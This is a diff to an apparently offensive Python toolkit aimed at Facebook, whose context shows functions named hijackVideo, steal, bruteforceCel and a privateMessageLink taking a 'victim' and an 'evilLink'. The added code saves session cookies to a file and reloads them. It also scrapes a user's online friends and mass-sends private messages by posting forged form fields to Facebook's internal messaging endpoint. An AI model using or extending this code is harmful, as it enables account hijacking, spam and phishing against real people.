@@ -21,6 +21,7 @@ import logging
 from mechanize import Request
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
+import datetime
 
 blocked = 0
 masterCj = ''
@@ -57,6 +58,7 @@ def login(email, password,state):
     elem.send_keys(password)  
     elem.send_keys(Keys.RETURN)
     all_cookies = driver.get_cookies()
+    pickle.dump( driver.get_cookies() , open("cookies.pkl","wb"))
     assert "No results found." not in driver.page_source
     driver.close()
         
@@ -1026,6 +1028,13 @@ def hijackVideo(videoLink,title,summary,comment,videoID,hijackedVideo,privacy):
 #            print 'Ctrl+c SIGNAL Caught\n'
 #            return
 
+def getTime():
+    hour = datetime.datetime.strftime(datetime.datetime.now(), '%H:%M')
+    if int(hour.split(':')[0]) >= 12:
+        hour += 'am'
+    else:
+        hour += 'pm'
+    return hour
 
 def privateMessageLink(message,victim,subject,realLink,title,summary,imageLink,evilLink):
     
@@ -1041,10 +1050,9 @@ def privateMessageLink(message,victim,subject,realLink,title,summary,imageLink,e
             'message_batch[0][thread_id]' : '',
             'message_batch[0][author]' : 'fbid:'+c_user,
             'message_batch[0][author_email]' : '',
-            'message_batch[0][coordinates]' : '',
-            'message_batch[0][timestamp]' : '1394766424499',
+            'message_batch[0][timestamp]' : str(int(time())),
             'message_batch[0][timestamp_absolute]' : 'Today',
-            'message_batch[0][timestamp_relative]' : '12:07am',
+            'message_batch[0][timestamp_relative]' : getTime(),
             'message_batch[0][timestamp_time_passed]' : '0',
             'message_batch[0][is_unread]' : 'false',
             'message_batch[0][is_cleared]' : 'false',
@@ -3137,7 +3145,106 @@ def steal():
         else:
             sleep(10)
             print emails + ' not valid email or password'
+
+def sendPrivateMessage(message,buddy):
+    
+    c_user = getC_user()
+    
+    try:
+        fb_dtsg = set_dtsg()
+        if (fb_dtsg == 0):
+            print 'ERROR MOTHER FUCKER -_-'
             
+        arguments = {
+            'message_batch[0][action_type]' : 'ma-type:user-generated-message',
+            'message_batch[0][thread_id]' : '',
+            'message_batch[0][author]' : 'fbid:'+c_user,
+            'message_batch[0][author_email]' : '',
+            'message_batch[0][coordinates]' : '',
+            'message_batch[0][timestamp]' : str(int(time())),
+            'message_batch[0][timestamp_absolute]' : 'Today',
+            'message_batch[0][timestamp_relative]' : getTime(),
+            'message_batch[0][timestamp_time_passed]' : '0',
+            'message_batch[0][is_unread]' : 'false',
+            'message_batch[0][is_forward]' : 'false',
+            'message_batch[0][is_filtered_content]' : 'false',
+            'message_batch[0][is_filtered_content_bh]' : 'false',
+            'message_batch[0][is_filtered_content_account]' : 'false',
+            'message_batch[0][is_filtered_content_quasar]' : 'false',
+            'message_batch[0][is_filtered_content_invalid_app]' : 'false',
+            'message_batch[0][is_spoof_warning]' : 'false',
+            'message_batch[0][source]' : 'source:titan:web',
+            'message_batch[0][body]' : message,
+            'message_batch[0][has_attachment]' : 'false',
+            'message_batch[0][html_body]' : 'false',
+            'message_batch[0][specific_to_list][0]' : 'fbid:' + buddy,
+            'message_batch[0][specific_to_list][1]' : 'fbid:' + c_user,
+            'message_batch[0][force_sms]' : 'true',
+            'message_batch[0][ui_push_phase]' : 'V3',
+            'message_batch[0][status]' : '0',
+            'message_batch[0][message_id]' : '<1394766424499:3126670212-4125121119@mail.projektitan.com>',
+            'message_batch[0][client_thread_id]' : 'user:'+str(c_user),
+            'message_batch[0][manual_retry_cnt]' : '0',
+            'client' : 'web_messenger',
+            '__user' : c_user,
+            '__a' : '1',
+            '__dyn' : 'aKTyBW8BgBlyibgggDDzbHaF8x9DzECQHyUmyVbGAGQi8VpCC-KGBxmm6oxpbGES5V8Gh6VEChyd1eFEsz-dCxK9xibyfCChQEjkwzyAAEnhRGeKmhmKVRz9Hxmi8V9-i78',
+            '__req' : '1w',
+            'fb_dtsg' : fb_dtsg,
+            'ttstamp' : '2658171975212154891167782118',
+            '__rev' : '1925563'
+            }
+        datos = urlencode(arguments)
+        response = br.open('https://www.facebook.com/ajax/mercury/send_messages.php',datos)
+        
+        if globalLogging:
+                logs(response.read())
+    
+    except mechanize.HTTPError as e:
+        print e.code
+    except mechanize.URLError as e:
+            print e.reason.args         
+    except:
+        print 'Ctrl+c SIGNAL Caught\n'
+        return
+
+def sendBroadcast(online):
+    print 'Cookies will be saved and deleted after execution'
+    try:
+        driver = webdriver.Firefox()
+        driver.get("https://www.facebook.com/")
+        cookies = pickle.load(open("cookies.pkl", "rb"))
+        for cookie in cookies:
+            driver.add_cookie(cookie)
+        open("cookies.pkl", "wb").close()
+        driver.get("https://m.facebook.com/buddylist.php?ref_component=mbasic_home_header&ref_page=/wap/home.php&refid=8")
+        assert "Active Friends" in driver.title
+        data = driver.page_source
+        driver.close()
+        buddies = MyParser.parseOnline(data)
+        if len(buddies) == 0:
+            print 'Mmm houston we have a problem.. ERROR'
+            return
+        message = raw_input('Enter the message to send: ')
+        percentage = 0.0
+        i = 0
+        for buddy in buddies:
+            flush()
+            percentage = (100.0 * i)/len(buddies)
+            print '\rCompleted [%.2f%%]\r'%percentage,
+            sendPrivateMessage(message, buddy)
+            i += 1
+    except mechanize.HTTPError as e:
+        logs(e.code)
+        print e.code
+    except mechanize.URLError as e:
+        logs(e.reason.args)
+        print e.reason.args    
+    except:
+        logs('Error in the sendBroadcast module')
+        print '\rError in the sendBroadcast module\r'
+        raise
+ 
 def bruteforceCel(first,start,end):
     c_user = getC_user()
     try:
